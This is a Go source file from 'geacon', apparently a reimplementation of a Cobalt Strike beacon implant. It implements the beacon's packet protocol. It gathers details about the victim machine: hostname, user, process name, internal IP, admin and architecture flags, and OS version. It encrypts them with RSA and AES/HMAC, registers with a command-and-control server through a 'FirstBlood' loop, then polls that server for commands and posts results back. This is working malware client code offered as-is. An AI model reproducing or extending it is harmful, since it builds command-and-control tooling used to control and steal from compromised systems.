package packet

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"geacon/cmd/config"
	"geacon/cmd/crypt"
	"geacon/cmd/sysinfo"
	"geacon/cmd/util"
	"strconv"
	"strings"
	"time"

	"github.com/imroc/req"
)

var (
	encryptedMetaInfo string
	clientID          int
)

func WritePacketLen(b []byte) []byte {
	length := len(b)
	return WriteInt(length)
}

func WriteInt(nInt int) []byte {
	bBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(bBytes, uint32(nInt))
	return bBytes
}

func ReadInt(b []byte) uint32 {
	return binary.BigEndian.Uint32(b)
}

func DecryptPacket(b []byte) []byte {
	decrypted, err := crypt.AesCBCDecrypt(b, config.AesKey)
	if err != nil {
		panic(err)
	}
	return decrypted
}

func EncryptPacket() {

}

func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
	commandTypeBytes := make([]byte, 4)
	_, err := buf.Read(commandTypeBytes)
	if err != nil {
		panic(err)
	}
	commandType := binary.BigEndian.Uint32(commandTypeBytes)
	commandLenBytes := make([]byte, 4)
	_, err = buf.Read(commandLenBytes)
	if err != nil {
		panic(err)
	}
	commandLen := ReadInt(commandLenBytes)
	commandBuf := make([]byte, commandLen)
	_, err = buf.Read(commandBuf)
	if err != nil {
		panic(err)
	}
	*totalLen = *totalLen - (4 + 4 + commandLen)
	return commandType, commandBuf

}

func MakePacket(replyType int, b []byte) []byte {
	config.Counter += 1
	buf := new(bytes.Buffer)
	counterBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(counterBytes, uint32(config.Counter))
	buf.Write(counterBytes)

	if b != nil {
		resultLenBytes := make([]byte, 4)
		resultLen := len(b) + 4
		binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
		buf.Write(resultLenBytes)
	}

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := crypt.AesCBCEncrypt(buf.Bytes(), config.AesKey)
	if err != nil {
		return nil
	}
	// cut the zero because Golang's AES encrypt func will padding IV(block size in this situation is 16 bytes) before the cipher
	encrypted = encrypted[16:]

	buf.Reset()

	sendLen := len(encrypted) + crypt.HmacHashLen
	sendLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sendLenBytes, uint32(sendLen))
	buf.Write(sendLenBytes)
	buf.Write(encrypted)
	hmacHashBytes := crypt.HmacHash(encrypted)
	buf.Write(hmacHashBytes)

	return buf.Bytes()

}

func EncryptedMetaInfo() string {
	packetUnencrypted := MakeMetaInfo()
	packetEncrypted, err := crypt.RsaEncrypt(packetUnencrypted)
	if err != nil {
		panic(err)
	}

	//TODO c2profile encode method
	finalPakcet := base64.StdEncoding.EncodeToString(packetEncrypted)
	return finalPakcet
}

/*
MetaData for 4.1
	Key(16) | Charset1(2) | Charset2(2) |
	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
*/
func MakeMetaInfo() []byte {
	crypt.RandomAESKey()
	sha256hash := sha256.Sum256(config.GlobalKey)
	config.AesKey = sha256hash[:16]
	config.HmacKey = sha256hash[16:]

	clientID = sysinfo.GeaconID()
	processID := sysinfo.GetPID()
	//for link SSH, will not be implemented
	sshPort := 0
	/* for is X64 OS, is X64 Process, is ADMIN
	METADATA_FLAG_NOTHING = 1;
	METADATA_FLAG_X64_AGENT = 2;
	METADATA_FLAG_X64_SYSTEM = 4;
	METADATA_FLAG_ADMIN = 8;
	*/
	metadataFlag := sysinfo.GetMetaDataFlag()
	//for OS Version
	osVersion := sysinfo.GetOSVersion()
	osVerSlice := strings.Split(osVersion, ".")
	osMajorVerison := 0
	osMinorVersion := 0
	osBuild := 0
	if len(osVerSlice) == 3 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
		osBuild, _ = strconv.Atoi(osVerSlice[2])
	} else if len(osVerSlice) == 2 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
	}


	//for Smart Inject, will not be implemented
	ptrFuncAddr := 0
	ptrGMHFuncAddr := 0
	ptrGPAFuncAddr := 0

	processName := sysinfo.GetProcessName()
	localIP := sysinfo.GetLocalIPInt()
	hostName := sysinfo.GetComputerName()
	currentUser := sysinfo.GetUsername()

	localeANSI := sysinfo.GetCodePageANSI()
	localeOEM := sysinfo.GetCodePageOEM()

	clientIDBytes := make([]byte, 4)
	processIDBytes := make([]byte, 4)
	sshPortBytes := make([]byte, 2)
	flagBytes := make([]byte, 1)
	majorVerBytes := make([]byte, 1)
	minorVerBytes := make([]byte, 1)
	buildBytes := make([]byte, 2)
	ptrBytes := make([]byte, 4)
	ptrGMHBytes := make([]byte, 4)
	ptrGPABytes := make([]byte, 4)
	localIPBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(clientIDBytes, uint32(clientID))
	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
	binary.BigEndian.PutUint16(sshPortBytes, uint16(sshPort))
	flagBytes[0] = byte(metadataFlag)
	majorVerBytes[0] = byte(osMajorVerison)
	minorVerBytes[0] = byte(osMinorVersion)
	binary.BigEndian.PutUint16(buildBytes, uint16(osBuild))
	binary.BigEndian.PutUint32(ptrBytes, uint32(ptrFuncAddr))
	binary.BigEndian.PutUint32(ptrGMHBytes, uint32(ptrGMHFuncAddr))
	binary.BigEndian.PutUint32(ptrGPABytes, uint32(ptrGPAFuncAddr))
	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))

	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
	osInfoBytes := []byte(osInfo)

	fmt.Printf("clientID: %d\n", clientID)
	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)

	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
	magicNum := sysinfo.GetMagicHead()
	metaLen := WritePacketLen(metaInfo)
	packetToEncrypt := util.BytesCombine(magicNum, metaLen, metaInfo)

	return packetToEncrypt
}

func FirstBlood() bool {
	encryptedMetaInfo = EncryptedMetaInfo()
	for {
		resp := HttpGet(config.GetUrl, encryptedMetaInfo)
		if resp != nil {
			fmt.Printf("firstblood: %v\n", resp)
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	time.Sleep(config.WaitTime)
	return true
}

func PullCommand() *req.Resp {
	resp := HttpGet(config.GetUrl, encryptedMetaInfo)
	fmt.Printf("pullcommand: %v\n", resp.Request().URL)
	return resp
}

func PushResult(b []byte) *req.Resp {
	url := config.PostUrl + strconv.Itoa(clientID)
	resp := HttpPost(url, b)
	fmt.Printf("pushresult: %v\n", resp.Request().URL)
	return resp
}

/*
func processError(err string) {
	errIdBytes := WriteInt(0) // must be zero
	arg1Bytes := WriteInt(0)  // for debug
	arg2Bytes := WriteInt(0)
	errMsgBytes := []byte(err)
	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
	finalPaket := MakePacket(31, result)
	PushResult(finalPaket)
}
*/
